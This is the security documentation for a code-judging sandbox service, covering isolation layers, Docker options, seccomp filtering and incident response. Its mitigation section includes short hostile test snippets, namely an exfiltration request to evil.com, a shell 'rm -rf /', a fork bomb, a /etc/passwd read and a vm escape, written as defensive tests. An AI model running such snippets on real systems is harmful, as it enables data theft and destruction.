# Judge Service Security Documentation

## Overview

This document describes the security architecture of the UltiCode Judge Service, which is designed to safely execute untrusted user-submitted code.

## Threat Model

### Adversary Capabilities

We assume that users can:
- Submit arbitrary JavaScript/TypeScript code
- Attempt to escape the sandbox
- Try to access sensitive system resources
- Attempt denial-of-service attacks
- Collude with other users

### Security Goals

1. **Isolation**: Prevent code from affecting the host system
2. **Resource Protection**: Limit CPU, memory, and I/O usage
3. **Data Protection**: Prevent access to sensitive files and data
4. **Availability**: Prevent DoS attacks against the judge service

## Security Layers

The judge service implements defense-in-depth with multiple isolation layers:

```
┌─────────────────────────────────────────────────────────────────┐
│                        Security Layers                           │
├─────────────────────────────────────────────────────────────────┤
│                                                                  │
│  Layer 1: Process Isolation (Linux namespaces)                  │
│  ├─ PID namespace: Isolated process tree                        │
│  ├─ Network namespace: No network access                        │
│  ├─ Mount namespace: Separate filesystem view                   │
│  └─ UTS namespace: Separate hostname                            │
│                                                                  │
│  Layer 2: Resource Limits (cgroups)                             │
│  ├─ Memory limit: 256MB max                                     │
│  ├─ CPU limit: 0.5 cores                                        │
│  ├─ Process limit: 50 processes                                 │
│  └─ I/O throttling: Limited disk I/O                            │
│                                                                  │
│  Layer 3: Filesystem Isolation                                  │
│  ├─ Read-only root filesystem                                   │
│  ├─ No host volume mounts                                       │
│  ├─ Temporary filesystems only (tmpfs)                          │
│  └─ No access to Docker socket                                  │
│                                                                  │
│  Layer 4: Syscall Filtering (seccomp)                           │
│  ├─ Block dangerous syscalls (ptrace, mount, etc.)              │
│  ├─ Allow only necessary operations                             │
│  └─ No new privileges                                           │
│                                                                  │
│  Layer 5: Privilege Separation                                  │
│  ├─ Non-root user (UID 1001)                                    │
│  ├─ No capabilities                                             │
│  ├─ No setuid/setgid binaries                                   │
│  └─ Dropping all capabilities                                   │
│                                                                  │
│  Layer 6: Network Isolation                                     │
│  ├─ network_mode: none                                          │
│  ├─ No external network access                                  │
│  ├─ No inter-container communication                            │
│  └─ Only HTTP to localhost for executor                         │
│                                                                  │
└─────────────────────────────────────────────────────────────────┘
```

## Container Security Configuration

### Docker Run Options

```bash
docker run \
  --network none \                    # No network access
  --read-only \                       # Read-only root filesystem
  --memory=256m \                     # Memory limit
  --cpus=0.5 \                        # CPU limit
  --pids-limit=50 \                   # Process limit
  --security-opt=no-new-privileges \  # Prevent privilege escalation
  --security-opt seccomp=seccomp-profile.json \  # Syscall filtering
  --user 1001:1001 \                  # Non-root user
  --tmpfs /tmp:rw,noexec,nosuid \     # Temp filesystem (no execute)
  --tmpfs /workspace:rw,noexec,nosuid # Workspace (no execute)
  ulticode-judge:latest
```

### Seccomp Profile

The seccomp profile blocks dangerous system calls:

**Blocked syscalls include:**
- `ptrace` - Process debugging/tracing
- `mount`/`umount` - Filesystem mounting
- `chmod`/`chown` - Permission changes
- `setuid`/`setgid` - Privilege escalation
- `kexec_load` - Kernel loading
- `swapon`/`swapoff` - Swap manipulation
- `reboot` - System reboot
- `init_module` - Kernel module loading

**Allowed syscalls include:**
- Basic I/O: `read`, `write`, `close`
- Memory management: `mmap`, `mprotect`, `munmap`
- Process management: `exit`, `exit_group`, `clone`
- Time: `clock_gettime`, `gettimeofday`
- Basic operations needed for Node.js runtime

## Attack Mitigation

### 1. Filesystem Access Prevention

**Attack:** Reading sensitive files (`/etc/passwd`, secrets, code)

**Mitigation:**
- Read-only root filesystem
- No mounted volumes from host
- Temporary filesystems only (deleted on container stop)
- No access to Docker socket

**Test:**
```javascript
const fs = require('fs');
fs.readFileSync('/etc/passwd', 'utf8'); // Fails: EROFS (read-only filesystem)
```

### 2. Network Access Prevention

**Attack:** Exfiltrating data via HTTP, attacking other services

**Mitigation:**
- `network_mode: none` - Complete network isolation
- No DNS resolution possible
- No outbound connections possible

**Test:**
```javascript
const http = require('http');
http.get('http://evil.com/steal?data=...'); // Fails: ENETUNREACH
```

### 3. Process Isolation

**Attack:** Spawning child processes, shell escapes

**Mitigation:**
- Seccomp blocks `fork`, `execve`, `clone` with certain flags
- Process limit via cgroups (50 max)
- No shell available in container

**Test:**
```javascript
const { spawn } = require('child_process');
spawn('sh', ['-c', 'rm -rf /']); // Fails: seccomp filter
```

### 4. Resource Exhaustion Prevention

**Attack:** Fork bombs, memory hogs, CPU loops

**Mitigation:**
- Memory limit: 256MB (enforced by cgroups)
- CPU limit: 0.5 cores
- Process limit: 50
- Timeout: 2 seconds per execution

**Test:**
```javascript
// Fork bomb
while (true) { require('child_process').spawn('node'); }
// Blocked by process limit
```

### 5. VM Module Escape Prevention

**Attack:** Escaping the vm module inside the container

**Mitigation:**
- Even if vm is escaped, container provides primary security
- No network/filesystem access regardless
- Resource limits still apply
- Container is destroyed after execution

**Test:**
```javascript
const ForeignFunction = this.constructor.constructor('return process')();
// Even if this works, process is isolated inside container
```

## Security Testing

### Automated Security Tests

Location: `backend/test/security/sandbox-escape.spec.ts`

**Test Categories:**
1. Filesystem access prevention
2. Network access prevention
3. Process isolation
4. Resource limits enforcement
5. VM escape attempts
6. Seccomp enforcement

### Manual Security Testing

**Before Production Deployment:**

1. **Sandbox Escape Attempts**
   ```bash
   # Run known sandbox escape payloads
   npm run test:security
   ```

2. **Resource Limit Testing**
   ```bash
   # Test memory limits
   npm run test:memory

   # Test CPU limits
   npm run test:cpu
   ```

3. **Network Isolation Verification**
   ```bash
   # Verify no network access
   docker network inspect bridge
   ```

## Incident Response

### If Sandbox Escape is Suspected

1. **Immediate Actions**
   - Stop all judge containers: `docker stop $(docker ps -q --filter "label=ulticode-judge")`
   - Set feature flag: `JUDGE_CONTAINER_ENABLED=false`
   - Restart backend service
   - Preserve container logs for analysis

2. **Investigation**
   - Review Docker daemon logs
   - Check system logs for suspicious activity
   - Analyze the malicious code that caused the escape
   - Document findings

3. **Remediation**
   - Patch the vulnerability
   - Update seccomp profiles
   - Add additional restrictions
   - Re-test before re-enabling

## Compliance and Auditing

### Logging

All executions are logged with:
- Container ID used
- Execution time
- Memory usage
- Result status
- Any errors

### Audit Trail

```json
{
  "timestamp": "2026-02-08T12:00:00Z",
  "containerId": "abc123...",
  "userId": "user456",
  "problemId": "problem789",
  "language": "javascript",
  "executionTime": 1234,
  "memoryUsed": 45.2,
  "result": "Accepted"
}
```

## Best Practices

### Development

1. **Never disable security features** for convenience
2. **Always test with malicious inputs** before deployment
3. **Keep dependencies updated** to patch known vulnerabilities
4. **Review seccomp profiles** when adding new language support

### Operations

1. **Monitor container stats** for anomalies
2. **Set up alerts** for unusual resource usage
3. **Regular security audits** of container configuration
4. **Incident response plan** should be documented and tested

### Development Workflow

1. Write code with security in mind
2. Run automated security tests
3. Manual penetration testing
4. Code review with security focus
5. Staging deployment with monitoring
6. Production rollout with feature flag

## References

- [Docker Security](https://docs.docker.com/engine/security/)
- [Seccomp](https://www.kernel.org/doc/html/latest/userspace-api/seccomp.html)
- [Linux Namespaces](https://man7.org/linux/man-pages/man7/namespaces.7.html)
- [Cgroups](https://www.kernel.org/doc/html/latest/admin-guide/cgroup-v2.html)
- [Node.js vm module security considerations](https://nodejs.org/api/vm.html#vm_what_makes_the_vm_module_not_safe_for_untrusted_code)

## Changelog

| Date | Change | Impact |
|------|--------|--------|
| 2026-02-08 | Initial security documentation | N/A |

---

**Document Version:** 1.0.0
**Last Updated:** 2026-02-08
**Maintained By:** Backend Team
